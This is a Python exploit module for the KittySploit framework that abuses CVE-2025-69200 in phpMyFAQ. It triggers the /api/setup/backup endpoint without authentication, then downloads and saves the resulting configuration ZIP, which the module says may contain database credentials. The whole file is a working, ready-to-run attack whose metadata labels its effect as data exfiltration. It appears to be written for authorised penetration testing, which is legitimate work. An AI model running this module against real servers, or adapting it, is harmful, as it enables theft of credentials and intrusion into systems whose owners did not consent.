#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpMyFAQ unauthenticated config backup download (CVE-2025-69200)."""

import json
import re
from urllib.parse import urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'phpMyFAQ - Unauth Config Backup Download (CVE-2025-69200)',
        'description': (
            'Triggers POST /api/setup/backup without authentication and downloads the '
            'generated configuration ZIP (may contain database.php credentials) — '
            'CVE-2025-69200.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2025-69200'],
        'platform': Platform.MULTI,
        'references': [
            'https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-9cg9-4h4f-j6fg',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-69200',
        ],
        'tags': [
            'phpmyfaq', 'backup', 'exposure', 'credentials', 'unauth', 'cve-2025-69200',
        ],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 2,
            'reversible': False,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2025_69200_detect'],
            },
        },
    }

    base_path = OptString('', 'Optional phpMyFAQ base path prefix', required=False)
    version_string = OptString(
        '4.0.15',
        'Installed-version string sent as POST body',
        required=False,
    )
    output_file = OptString(
        'phpmyfaq-config-backup.zip',
        'Local path to write the downloaded ZIP',
        required=False,
    )

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def _to_path(self, backup_url: str) -> str:
        backup_url = str(backup_url or '').strip()
        if not backup_url:
            return ''
        if backup_url.startswith('http://') or backup_url.startswith('https://'):
            parsed = urlparse(backup_url)
            return parsed.path or ''
        if not backup_url.startswith('/'):
            return f'{self._prefix()}/{backup_url.lstrip("/")}'
        return backup_url

    def run(self):
        api = f'{self._prefix()}/api/setup/backup'
        print_status(f'Triggering backup via POST {api} ...')
        r = self.http_request(
            method='POST',
            path=api,
            data=str(self.version_string or '4.0.15'),
            headers={'Content-Type': 'text/plain'},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error('Backup endpoint not accessible')
            return False

        body = r.text or ''
        backup = ''
        try:
            data = json.loads(body)
            backup = str(
                data.get('backupFile')
                or data.get('backup')
                or data.get('url')
                or ''
            )
        except Exception:
            m = re.search(
                r'(https?://[^"\s]+phpmyfaq-config-backup[^"\s]+\.zip|'
                r'/[^"\s]*content/core/config/[^"\s]+\.zip|'
                r'phpmyfaq-config-backup[^"\s]+\.zip)',
                body,
            )
            if m:
                backup = m.group(1)

        path = self._to_path(backup)
        if not path:
            print_error(f'No backupFile in response: {body[:300]}')
            return False

        print_status(f'Downloading {path} ...')
        dl = self.http_request(method='GET', path=path, allow_redirects=False)
        if not dl or dl.status_code != 200:
            print_error('Failed to download backup ZIP')
            return False
        data = dl.content or b''
        if not data.startswith(b'PK'):
            print_warning('Response does not look like a ZIP archive')
        out = str(self.output_file or 'phpmyfaq-config-backup.zip').strip()
        with open(out, 'wb') as fh:
            fh.write(data)
        print_success(f'Saved {len(data)} bytes to {out}')
        return True
